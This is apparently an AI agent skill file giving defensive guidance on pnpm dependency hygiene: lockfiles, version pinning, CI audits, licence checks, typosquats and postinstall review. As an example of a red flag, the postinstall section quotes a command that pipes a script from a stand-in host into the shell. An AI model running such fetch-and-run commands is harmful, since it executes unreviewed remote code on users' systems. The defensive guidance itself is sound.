---
name: supply-chain-and-dependencies
description: Use when adding, upgrading, or pinning a dependency; or when reviewing lockfile churn, CVE reports, or license changes. Do NOT use for internal package imports (use `architecture-guard`). Covers lockfile discipline, SCA, pinned versions, license policy, peer-dep drift, typosquat detection.
allowed-tools: Read, Grep, Glob, Bash
---

# Supply-chain and dependencies

## Purpose & scope

Every `pnpm add` is a supply-chain decision. Every `pnpm add` ships its transitive closure, runs `postinstall` with full filesystem access, and trusts the maintainer to not publish malware.

## Core rules

1. **A lockfile (`pnpm-lock.yaml`) exists, is committed to the repository, and `pnpm install --frozen-lockfile` is used in every CI job that installs dependencies.** — *Why:* without a committed lockfile, two different CI runs of the same commit can resolve different transitive dependency versions — a silent non-determinism that makes reproducing bugs nearly impossible.

2. **Direct dependencies are pinned or narrowly ranged (`^1.2.3` is acceptable; `*`, `latest`, or an empty version field are never acceptable).** — *Why:* `latest` and `*` outsource the version decision to whoever published last. A supply-chain attacker who gains publish access — or a maintainer who ships a breaking change — immediately affects every install.

3. **SCA (Software Composition Analysis) runs in CI: `pnpm audit` or a tool such as Snyk is executed on every pull request, and high/critical CVEs block merge.** — *Why:* vulnerabilities in transitive dependencies are invisible to manual review. Automated SCA surfaces them at the earliest point — the PR — when the cost of reverting is lowest. Blocking on high/critical ensures that a known exploit path cannot ship silently because the reviewer did not happen to check the advisory feed.

4. **Every new direct dependency is evaluated before merge: maintenance status, weekly download count, last-release date, maintainer count, and available alternatives are all assessed.** — *Why:* a package with one maintainer, no releases in three years, and 200 weekly downloads is a supply-chain liability regardless of its current CVE status.

5. **License policy is enforced: permissive licenses (MIT, Apache-2.0, BSD-2/3-Clause, ISC) are accepted by default; GPL/AGPL/LGPL require explicit written approval; unlicensed packages are rejected.** — *Why:* a GPL or AGPL dependency in a commercial product can trigger copyleft obligations that require open-sourcing the entire application.

6. **Peer-dependency warnings in `pnpm install` output are resolved before merging, not suppressed or ignored.** — *Why:* Peer-dep warnings signal disagreement on a shared dep; React 17/18 mismatches silently break hooks.

7. **`postinstall` scripts from newly added packages are reviewed explicitly; unknown packages are installed with `--ignore-scripts` until the script content has been audited.** — *Why:* `postinstall` scripts execute arbitrary code with the permissions of the installing process. Malicious packages routinely use `postinstall` to exfiltrate environment variables, write backdoors to `~/.ssh`, or contact attacker-controlled endpoints.

## Red flags

| Thought | Reality |
|---|---|
| "I used `npm audit fix --force` to clear the CVEs" | `--force` upgrades past semver compatibility boundaries and may introduce breaking changes or resolve to a version with different (unreviewed) transitive dependencies. Review every change in the lockfile diff before accepting the fix. |
| "`latest` means we always get security patches automatically" | `latest` also means you get breaking changes, regressions, and supply-chain attacks automatically, with no human checkpoint. Pin to a range and use Renovate or Dependabot to surface updates as reviewable PRs. |
| "The peer-dep warning is harmless — it's been there forever" | Peer-dep warnings that have existed for a long time are the most dangerous: they have normalised into invisible background noise while a real version conflict silently affects runtime behaviour. Fix them; do not add new ones. |

## Good vs bad

### Pinned version range vs floating specifier

Bad — floating specifier that resolves to an unknown future version:

```json
{
  "dependencies": {
    "axios": "latest",
    "lodash": "*",
    "zod": ""
  }
}
```

Good — narrow range with the lockfile as the authoritative resolved version:

```json
{
  "dependencies": {
    "axios": "^1.7.2",
    "lodash": "^4.17.21",
    "zod": "^3.23.8"
  }
}
```

### Frozen lockfile install in CI vs default install

Bad — default install that can silently drift:

```yaml
# .github/workflows/ci.yml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - run: pnpm install   # resolves freshly; lockfile may be out of date
      - run: pnpm test
```

Good — frozen install that fails loudly on lockfile drift:

```yaml
# .github/workflows/ci.yml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - uses: pnpm/action-setup@a7487ba4aa9f8cf9e2b21a04a6c0e6a0c9e9dc29  # v4.0.0
        with:
          version: 9
      - run: pnpm install --frozen-lockfile
      - run: pnpm test
```

`--frozen-lockfile` exits with a non-zero code if the lockfile does not match `package.json`.

---

## Lockfile discipline

`package.json` expresses intent (ranges); the lockfile records fact (exact resolved versions and integrity hashes for every package in the graph).

**`pnpm-lock.yaml` must be committed.** Without the lockfile, two `pnpm install` invocations a week apart can produce different `node_modules` against the same `package.json`.

**The lockfile diff is a review artefact.** When a PR changes `package.json`, the `pnpm-lock.yaml` diff should be reviewed alongside it. Look for:
- Unexpected transitive bumps (a new version of `react` appearing when only a utility library was added).
- Integrity hash changes for packages whose version did not change (can indicate a publish-time substitution).
- New packages added transitively that were not in the original dependency.

When CI's `--frozen-lockfile` fails: regenerate locally, commit both files. Never bypass with `--no-frozen-lockfile`.

**Automated updates via Renovate or Dependabot.** Configure one of these tools to open PRs that bump dependency ranges and regenerate the lockfile simultaneously. Each update PR contains a lockfile diff and a link to the changelog; the reviewer sees exactly what changed.

```yaml
# .github/dependabot.yml — minimal Dependabot configuration for npm/pnpm
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 10
    commit-message:
      prefix: "chore(deps)"
```

For Renovate, a `renovate.json` in the repository root enables the bot; the default configuration is reasonable for most projects and groups minor/patch updates into a single weekly PR to reduce noise.

---

## SCA in CI

SCA must run on every PR — local-only is insufficient.

**`pnpm audit`.** The built-in audit command queries the npm advisory database and reports CVEs by severity. Add it as a required CI step:

```yaml
- name: Dependency audit
  run: pnpm audit --audit-level=high
```

`--audit-level=high` exits non-zero on high/critical findings; moderate/low report only.

**Snyk.** Snyk extends the advisory database with proprietary research and provides fix guidance that goes beyond the npm registry. For projects with a Snyk account:

```yaml
- name: Snyk vulnerability scan
  run: npx snyk test --severity-threshold=high
  env:
    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

Snyk also supports `snyk monitor` to continuously track the project's dependency state and alert on newly published CVEs against the current lockfile.

**Renovate / Dependabot vulnerability alerts.** GitHub's Dependabot vulnerability alerts surface CVEs automatically when new advisories are published against a committed lockfile, without requiring a new PR to trigger the check. Enable them in **Settings → Security → Dependabot alerts**. Pair with **Dependabot security updates** to have Dependabot automatically open a PR with the patched version when a fix is available.

**Handling audit failures.** When `pnpm audit` blocks a PR:
1. Determine whether a fixed version exists. If yes, bump the affected package and regenerate the lockfile.
2. If the vulnerability is in a transitive dependency with no upstream fix, use `pnpm.overrides` in `package.json` to force a patched version: `"pnpm": { "overrides": { "vulnerable-pkg": "^2.3.1" } }`.
3. If no fix exists and the package cannot be removed, document the accepted risk in a comment and apply a time-bounded `pnpm audit --ignore` exception that expires when a fix is expected.

Never suppress the audit step unconditionally. An ignored CVE that ships to production is a liability; an ignored CVE that is documented, time-bounded, and tracked is a managed risk.

---

## Licence policy

A single GPL dependency in a commercial, closed-source product can, under strict interpretation, trigger a copyleft obligation to release the entire application's source.

**Default-accepted licences:** MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC, 0BSD, Unlicense (public domain dedication).

**Requires explicit written approval:** LGPL-2.0, LGPL-2.1, LGPL-3.0, GPL-2.0, GPL-3.0, AGPL-3.0, EUPL, CDDL. Approval must come from the legal or engineering leadership and be recorded in a decision log or ADR.

**Rejected:** any package with no license field, `UNLICENSED` in the `license` field (indicating the author reserves all rights), or a custom license that has not been reviewed.

**`license-checker` in CI.** Run `license-checker` to enumerate every transitive dependency's license and fail the build if a disallowed license appears:

```yaml
- name: Licence audit
  run: |
    npx license-checker \
      --onlyAllow "MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause;ISC;0BSD;Unlicense;Python-2.0;CC0-1.0;CC-BY-3.0;CC-BY-4.0" \
      --excludePrivatePackages \
      --production
```

The `--onlyAllow` list is the canonical approved list; any package with a license outside this list fails the step.

**Dual-licensed packages:** read carefully — the permissive option may require open-sourcing your product.

---

## Evaluating new dependencies

Before adding a package as a direct dependency, score it against these criteria.

**Weekly downloads.** Check the npm registry or `npmjs.com`. A package with fewer than 10,000 weekly downloads is niche; below 1,000 it is experimental or abandoned.

**Last release date.** A package that has not had a release in over two years is likely unmaintained. For non-trivial packages, check whether the absence of releases reflects stability (the package is complete and unchanged) or abandonment (issues accumulate, PRs go unreviewed).

**Maintainer count.** Single-maintainer packages are a bus-factor + supply-chain risk. Prefer packages with multiple maintainers or organisational ownership.

**Alternatives.** Always ask: is there a smaller, more focused package that does this one thing? Is the functionality available in the platform or standard library? A 20-line utility function implemented in-house carries zero supply-chain risk.

**Bundle size.** Use `bundlephobia.com` to check the minified+gzipped size of the package and its dependencies.

**Scoring template (use in PR description):**

```
Package: <name>@<version>
Weekly downloads: <n>
Last release: <date>
Maintainers: <n>
License: <SPDX>
Bundle size: <n> KB (minified+gzip)
Alternatives considered: <list>
Reason for choice: <one sentence>
```

---

## Supply-chain red flags (typosquats, new maintainers, post-install)

**Typosquatting.** Attackers publish packages with names one character removed from popular packages: `loodash` for `lodash`, `cross-evn` for `cross-env`, `colers` for `colors`. Verify name spelling and repository URL before adding.

Signs of a typosquat: the package has very few downloads, was published recently, has a suspiciously broad `package.json` `description`, and has a `postinstall` script.

**New maintainer on a previously trusted package.** Treat package transfers as untrusted: when a long-time maintainer transfers ownership or publishes from a new account, prior trust does not transfer. Monitor with Dependabot/Snyk maintainer-change detection.

A new major version published within weeks of a maintainer change should be treated as untrusted until the changelog and diff have been reviewed.

**`postinstall` scripts.** Inspect the `scripts.postinstall` (and `preinstall`, `install`) fields in the target package's `package.json` before adding it. A script that runs `node scripts/setup.js` is reasonable; a script that runs `curl https://example.com/bootstrap.sh | sh` is a red flag regardless of the package's reputation. For any package with a non-trivial `postinstall`:

1. Read the script content in the package's repository.
2. Install with `--ignore-scripts` initially to prevent execution.
3. If the script is legitimate (native addon compilation, binary download), allow it explicitly and document why in the PR description.

```bash
# Install without running lifecycle scripts:
pnpm add some-package --ignore-scripts

# After reviewing the script, run it in isolation:
node node_modules/some-package/scripts/postinstall.js
```

**Integrity verification.** `pnpm-lock.yaml` records the `integrity` field for every resolved package — a SHA-512 hash of the package tarball. If a tarball is re-published at the same version with different contents (a known supply-chain attack vector), `pnpm install --frozen-lockfile` will detect the hash mismatch and fail.

---

## Interactions with other skills

- **Owns:** dependency policy — lockfile discipline, SCA, license enforcement, new-dep evaluation, supply-chain hygiene.
- **Hands off to:** `cicd-pipeline-safety` for where the audit and licence steps run and how they are gated; `performance-budget-guard` for the bundle-size impact of a new dependency; `secrets-and-config-safety` for secrets accidentally committed via a dependency's config file.
- **Does not duplicate:** `architecture-guard`'s enforcement of which internal packages may import which others.

## Review checklist

Produce a markdown report with these sections:

1. **Summary** — one line: GREEN / YELLOW / RED.
2. **Findings** — per issue: *file:line, severity (low/med/high), category, what is wrong, recommended fix*.
3. **Safer alternative** — prefer a vetted well-maintained transitive dependency over vendoring or forking a small one-function package; prefer an internal mirror (Verdaccio / CodeArtifact) over direct npm-registry fetches for CI reproducibility; prefer lockfile-aware SCA (`pnpm audit`, Socket.dev, OSV-Scanner) over version-range scans — analyze what you actually ship; prefer `--ignore-scripts` plus an explicit allowlist over trusting every `postinstall` hook for new dependencies.
4. **Checklist coverage** — for each of the 7 core rules, mark: PASS / CONCERN / NOT APPLICABLE.
   - Rule 1: `pnpm-lock.yaml` committed; CI uses `pnpm install --frozen-lockfile`
   - Rule 2: All direct dependencies use pinned or narrowly ranged versions; no `latest` or `*`
   - Rule 3: SCA (`pnpm audit` / Snyk) runs in CI; high/critical CVEs block merge
   - Rule 4: New direct dependencies evaluated for maintenance status, downloads, maintainer count, and alternatives
   - Rule 5: License policy enforced; GPL/AGPL require approval; unlicensed packages rejected
   - Rule 6: Peer-dependency warnings resolved; none suppressed or left open
   - Rule 7: `postinstall` scripts from new packages reviewed; unknown packages installed with `--ignore-scripts`
